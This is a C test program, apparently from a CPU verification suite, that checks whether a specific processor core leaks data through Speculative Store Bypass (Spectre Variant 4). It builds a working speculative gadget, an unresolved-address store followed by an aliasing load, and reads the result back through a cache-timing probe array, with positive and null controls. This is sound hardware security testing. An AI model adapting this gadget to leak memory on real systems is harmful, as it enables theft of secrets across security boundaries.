/**
 * spec-store-bypass: Speculative Store Bypass (Spectre Variant 4) detection.
 *
 * The original was tautological: two stores to the SAME statically-known
 * address with a fence between them, then an immediately following load.
 * That measures correct store-to-load forwarding and can never observe SSB.
 *
 * A real SSB window needs an older store whose ADDRESS is still unresolved
 * while a younger load with a KNOWN address aliases it.  Here ptr_slot[0]
 * is evicted so computing p = ptr_slot[0] misses; the store *p = NEWV has an
 * unresolved address, and the younger load *q (q is the static target_line)
 * aliases it.  A disambiguating core could issue *q early and read STALE.
 *
 * The core blocks ANY younger load while an older store address is unresolved
 * (rapt_lsu_ioq.sv:508-535, !ioq_addr_ready[j]; no nuke/replay), so the
 * expected verdict is NOT_VULNERABLE.  The suite must PROVE that negative:
 *  - a live positive control shows the probe channel registers the index;
 *  - a functional check counts stale reads directly;
 *  - the younger-load latency is compared against address resolution, so a
 *    fast bypass would be visible even if the value check were ambiguous.
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 100
#endif
#define STALE 0x55
#define NEWV 0x00

static uint8_t target_line[SC_LINE_BYTES]
    __attribute__((aligned(SC_LINE_BYTES)));
static uint8_t *ptr_slot[8] __attribute__((aligned(SC_LINE_BYTES)));
static uint8_t probe_array[SC_PROBE_ENTRIES * SC_PROBE_STRIDE]
    __attribute__((aligned(SC_PAGE_BYTES)));

int main(void) {
  if (sc_time_selfcheck("spec-store-bypass") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT spec-store-bypass ERROR reason=evict\n");
    return 1;
  }

  ptr_slot[0] = target_line;
  uint8_t *q = target_line; /* younger load address: statically known */
  for (int i = 0; i < SC_PROBE_ENTRIES; i++)
    probe_array[(uintptr_t)i * SC_PROBE_STRIDE] = 0;
  sc_fence();
  int expect = STALE;
  uint32_t R = SECURITY_ATTACK_ROUNDS;

  /* Positive control: architectural touch of the stale-indexed line. */
  sc_score_t pos;
  sc_score_reset(&pos);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    volatile uint8_t tmp = probe_array[(uintptr_t)expect * SC_PROBE_STRIDE];
    (void)tmp;
    sc_fence();
    sc_probe_array(probe_array, &g, &pos, 0x55 + r);
    pos.rounds++;
  }
  int pos_ok = pos.hits[expect] >= R / 2;

  sc_score_t atk, nul;
  sc_score_reset(&atk);
  sc_score_reset(&nul);
  uint32_t stale_cnt = 0;
  uint64_t cold_load_sum = 0, warm_load_sum = 0;

  for (uint32_t r = 0; r < R; r++) {
    for (int arm = 0; arm < 2; arm++) {
      sc_evict_capacity(&g);
      /* Attack arm leaves a STALE value to be bypassed; null arm does not. */
      target_line[0] = arm ? NEWV : STALE;
      sc_fence();
      if (!arm) {
        sc_evict_l1((const void *)ptr_slot, &g);
        sc_evict_l2((const void *)ptr_slot, &g);
      }
      sc_fence();
      uint64_t t0 = sc_cycle();
      uint8_t *p = ptr_slot[0]; /* cold on attack arm: address unresolved */
      *p = NEWV;                /* older store, unresolved address */
      uint8_t leaked = *q;      /* younger load, known aliasing address */
      uint64_t t1 = sc_cycle();
      if (!arm)
        cold_load_sum += (t1 - t0);
      else
        warm_load_sum += (t1 - t0);
      if (!arm && leaked == STALE)
        stale_cnt++;
      volatile uint8_t tmp = probe_array[(uintptr_t)leaked * SC_PROBE_STRIDE];
      (void)tmp;
      sc_fence();
      sc_score_t *s = arm ? &nul : &atk;
      sc_probe_array(probe_array, &g, s, 0x4444 + r + arm);
      s->rounds++;
    }
  }

  sc_decision_t d = sc_decide(&atk, &nul, expect, pos_ok);
  uint32_t cold_avg = (uint32_t)(cold_load_sum / R);
  uint32_t warm_avg = (uint32_t)(warm_load_sum / R);
  printf("[ssb] stale_reads=%u/%u cold_window=%u warm_window=%u cycles "
         "pos=%d/%u attack=%u/%u null=%u/%u\n",
         (unsigned)stale_cnt, (unsigned)R, (unsigned)cold_avg,
         (unsigned)warm_avg, (unsigned)pos.hits[expect], (unsigned)R,
         (unsigned)atk.hits[expect], (unsigned)R, (unsigned)nul.hits[expect],
         (unsigned)R);
  sc_result("spec-store-bypass", &d, pos_ok, expect, R, &g);
  if (stale_cnt > R / 4 || d.verdict == SC_VULNERABLE)
    printf("[ssb] VULNERABLE: younger load observed a stale value\n");
  else if (!pos_ok)
    printf("[ssb] INCONCLUSIVE: positive control failed\n");
  else
    printf("[ssb] NOT VULNERABLE: younger load blocked behind unresolved "
           "store address (structural immunity, positive control live)\n");
  return 0;
}